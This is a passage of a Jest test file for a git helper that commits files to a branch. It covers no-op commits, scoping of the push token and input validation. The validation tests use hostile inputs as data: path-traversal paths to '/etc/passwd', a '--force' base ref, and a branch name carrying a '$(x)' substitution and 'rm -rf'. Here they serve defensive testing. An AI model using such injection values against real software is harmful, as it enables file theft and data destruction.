    expect(() => git.commitFilesToBranch(options)).toThrow('push rejected')

    expect(mockExec.mock.calls.some((call) => call[1].includes('remove'))).toBe(
      true
    )
    expect(mockFs.rmSync).toHaveBeenCalled()
  })

  // Regression coverage: the old Git Data API happily "created" an empty
  // commit and force-updated the branch to the same tree when there was
  // nothing new to commit (e.g. a re-run right after the release content
  // already landed on main). `git commit` throws in that situation by
  // default, so this must be detected and no-op'd rather than failing.
  it('no-ops (skips the push) when there is nothing to commit', () => {
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('commit')) {
        return {
          stdout: 'nothing to commit, working tree clean',
          stderr: '',
          exitCode: 1
        }
      }
      if (args.includes('rev-parse')) {
        return ok('samesha\n')
      }
      return ok('')
    })

    const sha = git.commitFilesToBranch(options)

    expect(sha).toBe('samesha')
    expect(mockExec.mock.calls.some((call) => call[1].includes('push'))).toBe(
      false
    )
    // Still cleaned up.
    expect(mockExec.mock.calls.some((call) => call[1].includes('remove'))).toBe(
      true
    )
  })

  it('throws (does not silently no-op) when commit fails for a real reason', () => {
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('commit')) {
        return {
          stdout: '',
          stderr: 'fatal: unable to write new_index file',
          exitCode: 128
        }
      }
      return ok('')
    })

    expect(() => git.commitFilesToBranch(options)).toThrow(
      /unable to write new_index file/
    )
    expect(mockExec.mock.calls.some((call) => call[1].includes('push'))).toBe(
      false
    )
  })

  it('authenticates the push with the configured token, scoped to the push call only, resolving the real credential file from the worktree dir', () => {
    const credFile = '/home/runner/work/_temp/git-credentials-abc.config'
    git.configureGitAuth('super-secret-pat')
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('rev-parse')) return ok('newsha123\n')
      if (
        args.join(' ') ===
        `-C ${worktreeDir} config --show-origin --get-all http.https://github.com/.extraheader`
      ) {
        return ok(`file:${credFile}\tAUTHORIZATION: basic CHECKOUT_ORIGINAL\n`)
      }
      return ok('')
    })

    git.commitFilesToBranch(options)

    const pushCall = mockExec.mock.calls.find((call) =>
      call[1].includes('push')
    )
    expect(pushCall).toBeDefined()
    const env = (pushCall?.[2] as { env?: NodeJS.ProcessEnv } | undefined)?.env
    expect(env?.GIT_CONFIG_KEY_0).toBe('http.https://github.com/.extraheader')

    // The show-origin lookup is scoped to the worktree dir (whose own
    // includeIf.gitdir entry may differ from the main clone's) via -C, but
    // the resulting unset/add target the REAL credential file directly via
    // --file, not -C (a plain path, independent of any repo/worktree).
    expect(
      mockExec.mock.calls.some(
        (call) =>
          call[1].join(' ') ===
          `config --file ${credFile} --unset-all http.https://github.com/.extraheader`
      )
    ).toBe(true)
    expect(
      mockExec.mock.calls.some(
        (call) =>
          call[1].join(' ') ===
          `config --file ${credFile} --add http.https://github.com/.extraheader AUTHORIZATION: basic CHECKOUT_ORIGINAL`
      )
    ).toBe(true)

    // The commit and worktree-add calls are untouched by the auth override.
    const commitCall = mockExec.mock.calls.find((call) =>
      call[1].includes('commit')
    )
    expect(
      (commitCall?.[2] as { env?: NodeJS.ProcessEnv } | undefined)?.env
    ).toBeUndefined()

    git.configureGitAuth('')
  })

  it('refuses file paths escaping the worktree (path traversal)', () => {
    expect(() =>
      git.commitFilesToBranch({
        ...options,
        files: [{ path: '../../etc/passwd', content: 'evil' }]
      })
    ).toThrow(/Refusing to write outside the worktree/)

    // Nothing was written, and the worktree was still cleaned up.
    expect(mockFs.writeFileSync).not.toHaveBeenCalled()
    expect(mockExec.mock.calls.some((call) => call[1].includes('remove'))).toBe(
      true
    )
  })

  it('refuses absolute file paths outside the worktree', () => {
    expect(() =>
      git.commitFilesToBranch({
        ...options,
        files: [{ path: '/etc/passwd', content: 'evil' }]
      })
    ).toThrow(/Refusing to write outside the worktree/)
    expect(mockFs.writeFileSync).not.toHaveBeenCalled()
  })

  it('refuses base refs starting with -', () => {
    expect(() =>
      git.commitFilesToBranch({ ...options, baseRef: '--force' })
    ).toThrow(/Refusing to pass/)
    expect(mockExec).not.toHaveBeenCalled()
  })

  it('keeps hostile branch names inert inside the push refspec', () => {
    mockExec.mockImplementation((_file, args) =>
      args.includes('rev-parse') ? ok('sha\n') : ok('')
    )

    git.commitFilesToBranch({ ...options, branch: 'evil`$(x)`; rm -rf' })

    const pushCall = mockExec.mock.calls.find((call) =>
      call[1].includes('push')
    )
    expect(pushCall?.[1]).toContain('HEAD:refs/heads/evil`$(x)`; rm -rf')
  })
})
